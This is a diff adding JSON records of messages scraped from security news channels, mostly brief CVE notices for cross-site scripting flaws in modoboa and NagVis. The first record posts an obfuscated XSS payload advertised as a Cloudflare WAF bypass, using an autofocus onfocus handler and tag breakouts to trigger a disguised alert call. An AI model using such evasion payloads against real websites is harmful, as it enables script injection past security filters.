@@ -1,5 +1,21 @@
 {
     "date": "2023-10-20",
+    "from_channel": "proxy_bar",
+    "message": "Cloudflare bypass WAF\n*\nPayload:\n<inpuT autofocus oNFocus=\"setTimeout(function() { /*\\`*/top['al'+'\\u0065'+'rt']([!+[]+!+[]]+[![]+[]][+[]])/*\\`*/ }, 5000);\"></inpuT%3E&lT;/stYle&lT;/titLe&lT;/teXtarEa&lT;/scRipt&gT;\n\n#cloudflare #bypass #waf #xss",
+    "urls": []
+}
+{
+    "date": "2023-10-20",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-5688 ‼\n\nCross-site Scripting (XSS) - DOM in GitHub repository modoboa/modoboa prior to 2.2.2.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-10-20",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-5689 ‼\n\nCross-site Scripting (XSS) - DOM in GitHub repository modoboa/modoboa prior to 2.2.2.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-10-20",
     "from_channel": "cibsecurity",
     "message": "‼ CVE-2023-46287 ‼\n\nXSS exists in NagVis before 1.9.38 via the select function in share/server/core/functions/html.php.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
 }
